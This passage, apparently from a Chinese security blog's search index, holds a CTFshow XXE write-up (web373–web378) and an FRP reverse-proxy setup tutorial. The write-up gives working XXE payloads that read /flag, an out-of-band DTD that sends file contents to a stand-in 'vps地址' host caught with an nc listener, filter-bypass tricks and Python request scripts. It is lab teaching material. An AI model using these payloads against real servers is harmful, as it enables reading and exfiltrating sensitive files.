的标签则可以由开发者根据需求自己定义，用来清晰地描述数据的结构和含义。 举个例子 1234567&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;note&gt; &lt;to&gt;小明&lt;/to&gt; &lt;from&gt;小红&lt;/from&gt; &lt;heading&gt;提醒&lt;/heading&gt; &lt;body&gt;别忘了周五的会议！&lt;/body&gt;&lt;/note&gt; 为了更好地理解XXE，我们还需要了解XML中两个与漏洞密切相关的关键组件：DOCTYPE 和 ENTITY DOCTYPE (文档类型声明) ：它通常出现在XML文档的顶部，用于定义该文档的结构和规则。对于XXE漏洞来说，DOCTYPE最重要的作用是，它提供了一个可以定义实体（ENTITY）的地方 ENTITY (实体) ：必须在DOCTYPE声明中定义，主要有两种： 内部实体：像一个简单的文本变量，方便在文档中复用。例如：&lt;!ENTITY author &quot;Wayne&quot;&gt;，之后在文档中使用的 &amp;author; 就会被替换为 “Wayne” 外部实体：这是XXE漏洞的核心。它允许我们引用外部资源的内容，例如服务器上的一个文件或一个网址。例如：&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt; 什么是XXEXXE全称是“XML外部实体注入”（XML External Entity Injection），当一个应用程序接收并解析了用户提交的XML数据，但其XML解析器配置不当时，就容易产生XXE漏洞 流程大概如下 构造一个恶意的XML文档 在文档中定义一个指向服务器本地敏感文件的外部实体，例如： &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt; 在XML数据中引用这个实体 &amp;xxe; 服务器在解析这段XML时，会查找并读取 /etc/passwd 文件的内容，并用它替换掉 &amp;xxe; 最后，攻击者通过页面的回显（有回显XXE）或将数据发送到自己的服务器（无回显XXE）来窃取信息 题目列表web373题目给了源码，我们可以分析一下 1234567891011121314151617&lt;?phperror_reporting(0);//允许加载外部实体，在PHP 8.0及以上版本，此项默认为true。libxml_disable_entity_loader(false);//从HTTP请求的body中读取原始数据，一般是POST请求的内容。$xmlfile = file_get_contents('php://input');if(isset($xmlfile)){ //新建一个DOMDocument对象，用于处理XML。 $dom = new DOMDocument(); //LIBXML_NOENT: 替换XML文档中的实体；LIBXML_DTDLOAD: 允许加载外部DTD。 $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); //把DOM对象转换为PHP对象。 $creds = simplexml_import_dom($dom); $ctfshow = $creds-&gt;ctfshow; echo $ctfshow;}highlight_file(__FILE__); 由源码可知，这是个有回显的XXE，因此直接POST注入即可 payload： 12345678&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE test [&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot;&gt;]&gt;&lt;!-- 对应源码的$ctfshow = $creds-&gt;ctfshow; --&gt;&lt;creds&gt;&lt;ctfshow&gt;&amp;xxe;&lt;/ctfshow&gt;&lt;/creds&gt; web374分析源码 相比上一题，这一题少了回显代码，也就是 123$creds = simplexml_import_dom($dom);$ctfshow = $creds-&gt;ctfshow;echo $ctfshow; 因此这是个无回显的XXE，需要用到vps进行数据外带显示 payload： 12&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE test [&lt;!ENTITY % xxe SYSTEM &quot;http://vps地址/test.dtd&quot;&gt;%xxe;]&gt; 然后在vps的网站根目录创建test.dtd 12345&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;&gt;&lt;!-- “&amp;#x25;”是 % 的意思,因为是嵌套引用，所以不能直接写% --&gt;&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; out SYSTEM 'http://vps地址:1234/?x=%file;'&gt;&quot;&gt;%eval;%out; 保存文件并退出Vim：按下ESC进入命令模式，然后输入:wq并按回车键 最后在服务器用nc监听1234端口 1nc -lvvp 1234 接着发送POST请求 重新回到vps查看加密内容，然后base64解码即可 我们来分析一下思路，简单来说就是初始Payload调用了外部DTD，外部DTD中先用一个实体%eval;去定义另一个能发送数据的实体%out;，然后再调用这个新实体将文件内容外带出来 那为什么要这样子套娃，直接调用不可以吗 12&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;&gt;&lt;!ENTITY % out SYSTEM &quot;http://vps地址:1234/?x=%file;&quot;&gt; %out; 如果直接调用，上面第二步中的 &lt;!ENTITY % out ...&gt; 会直接导致XML解析器报错。因为在解析器看来，%file; 这个引用被用在了另一个实体 out 的定义字符串里，这是不被允许的 因此我们需要嵌套使用，用外部实体%eval;把内层命令伪装成一个字符串，当外部实体被调用后，此时%file; 实体已经被定义过了，最后再调用%out;，就可以成功执行命令 12345&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;&gt;&lt;!-- “&amp;#x25;”是 % 的意思,因为是嵌套引用，所以不能直接写% --&gt;&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; out SYSTEM 'http://vps地址:1234/?x=%file;'&gt;&quot;&gt;%eval;%out; web375先看看源码 跟上一题差不多，不过这次多了一个过滤条件，由于它是匹配整一个语句&lt;?xml version=&quot;1.0&quot;，因此有很多方法绕过 123if(preg_match('/&lt;\\?xml version=&quot;1\\.0&quot;/', $xmlfile)){ die('error');} 方法一： 在xml和version中加一个空格 12&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE test [&lt;!ENTITY % xxe SYSTEM &quot;http://vps地址/test.dtd&quot;&gt;%xxe;]&gt; 方法二： 直接把&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;去掉 1&lt;!DOCTYPE test [&lt;!ENTITY % xxe SYSTEM &quot;http://vps地址/test.dtd&quot;&gt;%xxe;]&gt; 方法三： 把双引号改成单引号，即&lt;?xml version='1.0' encoding=&quot;UTF-8&quot;?&gt; 12&lt;?xml version='1.0' encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE test [&lt;!ENTITY % xxe SYSTEM &quot;http://vps地址/test.dtd&quot;&gt;%xxe;]&gt; 随便选一种方法做即可，其他步骤跟上一题一样，成功得到flag web376先看源码 相比上一题，这题的过滤条件多了一个检测大小写功能，但是不影响做题，可以用上一题的方法 web377分析源码 这次多了一个http的过滤，可以用编码绕过，xml不仅支持UTF-8编码，也支持UTF-16、UTF-32和EBCDIC编码 因此我们在web375绕过&lt;?xml version=&quot;1.0&quot;的基础上，加一个编码转换即可，用python脚本完成 1234567891011import requestsurl = &quot;http://48e31982-9b66-42aa-b386-f34f7b7f8d36.challenge.ctf.show/&quot;payload = &quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE test [&lt;!ENTITY % xxe SYSTEM &quot;http://vps地址/test.dtd&quot;&gt;%xxe;]&gt;&quot;&quot;&quot;payload = payload.encode('utf-16')response = requests.post(url, data=payload)print(response.text) 先在vps监听端口，然后运行脚本 web378打开题目看到一个登录框 ctrl+u查看网页源码，可以判断存在XXE漏洞 在登录框页面随便输入个账号密码，可以看到有回显，因此是属于有回显的XXE 因此我们可以构造XML payload，然后POST发送到/doLogin即可，这里用python脚本 1234567891011121314import requestsurl = &quot;http://39e1f8ce-fd5e-483d-a620-38d00350bff3.challenge.ctf.show/doLogin&quot;payload = &quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE test [&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot;&gt;]&gt;&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;&amp;xxe;&lt;/password&gt;&lt;/user&gt;&quot;&quot;&quot;response = requests.post(url, data=payload)print(response.text)","link":"/posts/ctfshow-xxe-web373-web378/"},{"title":"工具推荐 | 内网穿透神器FRP部署教程","text":"工具介绍FRP是一款高性能的反向代理工具，可以将位于NAT或防火墙后的本地服务器暴露到互联网上。目前支持TCP、UDP、HTTP和HTTPS协议，可通过域名将请求转发至内部服务，此外还提供P2P直连模式 Github地址：https://github.com/fatedier/frp 本文尽可能简单叙述，方便大家快速部署，因当前最新版是0.63.0，因此本文在0.63.0的基础上书写 准备条件 一台拥有公网IP的服务器（推荐阿里云、腾讯云等） 一个域名（非必需） 服务端安装打开https://github.com/fatedier/frp/tree/v0.63.0, 下载frp_0.63.0_linux_amd64.tar.gz 上传到服务器然后解压 1tar -zxvf frp_0.63.0_linux_amd64.tar.gz 配置cd进入frp_0.63.0_linux_amd64文件夹，输入vim frps.toml编辑frps.toml 12345678910111213141516# frp客户端与服务端连接的端口bindPort = 7000# 用来接收HTTP请求的端口vhostHTTPPort = 8088 #如端口冲突可自行切换# 认证配置[auth]token = &quot;admin_token&quot; #用于连接验证，请自行设置# Web仪表盘配置[webServer]addr = &quot;0.0.0.0&quot;port = 7500user = &quot;admin&quot; #请自行设置password = &quot;admin&quot; #请自行设置 按下ESC进入命令模式，然后输入:wq并按回车键，保存文件并退出Vim 运行为了能在后台持续运行，这里用screen启动一个新窗口 1screen -S frp #名字可以自定义 赋予执行权限 1chmod +x frps 运行脚本 1./frps -c ./frps.toml 按下组合键 ctrl+a+d 关闭当前screen窗口，运行下面的命令可以再次进入窗口 12screen -ls #查看当前screen状态screen -r frp 网页仪表盘成功运行之后，打开http://你的服务器IP:7500，即可进入仪表盘页面，可以查看当前的配置、连接等状态 客户端安装打开https://github.com/fatedier/frp/tree/v0.63.0, 下载frp_0.63.0_windows_amd64.zip 配置解压并打开文件夹，编辑frpc.toml 1234567891011serverAddr = &quot;你的服务器IP地址&quot;serverPort = 7000[auth]token = &quot;admin_token&quot; #需要跟服务端的token保持一致，用于验证[[proxies]]name = &quot;my-web-service&quot; #可自行设置type = &quot;tcp&quot; #穿透的协议类型，ip+端口的话用tcplocalPort = 80 #需要穿透的本机端口remotePort = 8085 #指定服务端访问的端口，也就是可以通过&quot;你的服务器IP:8085&quot;访问到本机的&quot;127.0.0.1:80&quot; (可选)域名配置如果你有自己的域名，则可以进行域名配置，以获得更佳的体验 我这里用的是namesilo，其他的域名提供商也一样操作 具体操作就是在DNS Record添加一条A记录，地址填你的服务器IP，名字可以自定义，后面就通过这个子域名访问你的服务 然后打开frpc.toml重新编辑 1234567891011serverAddr = &quot;你的服务器IP地址&quot;serverPort = 7000[auth]token = &quot;admin_token&quot; #需要跟服务端的token保持一致，用于验证[[proxies]]name = &quot;my-web-service&quot; type = &quot;http&quot; #域名+端口的话需要用httplocalPort = 80 #需要穿透的本机端口，也就是可以通过&quot;你的域名:8088&quot;访问到本机的&quot;127.0.0.1:80&quot;customDomains = [&quot;win.xxxxxx.com&quot;] #这里用你自己的域名 需要注意的是，当代理类型为 http 或 https时，访问端口由服务端的 vhostHTTPPort决定，而不是客户端的 remotePort 运行在frp_0.63.0_windows_amd64文件夹打开cmd，输入 1frpc -c frpc.toml 然后公网访问 1http://你的服务器IP:8085 如果你配置了域名，就可以公网访问 1win.xxxxxx.com:8088 实例这里我举个简单的例子，方便大家理解 无域名我在本地部署了一个DVWA漏洞靶场，假如我想把它分享给其他人，应该怎么做 在服务端部署完毕后，回到本地电脑，phpstudy打开服务 由于我的DVWA部署在本地8084端口，因此先修改frpc.toml 1234567891011serverAddr = &quot;你的服务器IP地址&quot;serverPort = 7000[auth]token = &quot;admin_token&quot;[[proxies]]name = &quot;my-web-service&quot;type = &quot;tcp&quot;localPort = 8084 #需要穿透的本机端口remotePort = 8085 #指定服务端的端口 然后保存退出，在当前文件夹cmd执行 1frpc -c frpc.toml 接着访问你的服务器IP地址:8085即可 有域名同样是以DVWA漏洞靶场为例，先用phpstudy打开服务，然后修改frpc.toml 1234567891011serverAddr = &quot;你的服务器IP地址&quot;serverPort = 7000[auth]token = &quot;admin_token&quot;[[proxies]]name = &quot;my-web-service&quot; type = &quot;http&quot;localPort = 8084 #需要穿透的本机端口customDomains = [&quot;win.xxxxxx.com&quot;] #这里用你自己的域名 然后保存退出，在当前文件夹cmd执行 1frpc -c frpc.toml 接着访问你的域名:8088即可 常见问题与排错 (FAQ)如果你发现连接不到服务端的端口，请检查防火墙是否放行相关端口，如果系统本身已放行端口但仍无法访问，可能是服务器提供商那边的防火墙未放行，这时需要到提供商那边（假如是阿里云）放行相关端口","link":"/posts/frp-deployment-tutorial/"}],"tags":[{"name":"应急响应","slug":"应急响应","link":"/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"},{"name":"玄机靶场","slug":"玄机靶场","link":"/tags/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/"},{"name":"CTFSHOW","slug":"CTFSHOW","link":"/tags/CTFSHOW/"},{"name":"CTF练习","slug":"CTF练习","link":"/tags/CTF%E7%BB%83%E4%B9%A0/"},{"name":"工具推荐","slug":"工具推荐","link":"/tags/%E5%B7%A5%E5%85%B7%E6%8E%A8%E8%8D%90/"}],"categories":[{"name":"应急响应","slug":"应急响应","link":"/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"},{"name":"CTFSHOW","slug":"CTFSHOW","link":"/categories/CTFSHOW/"},{"name":"工具推荐","slug":"工具推荐","link":"/categories/%E5%B7%A5%E5%85%B7%E6%8E%A8%E8%8D%90/"}],"pages":[]}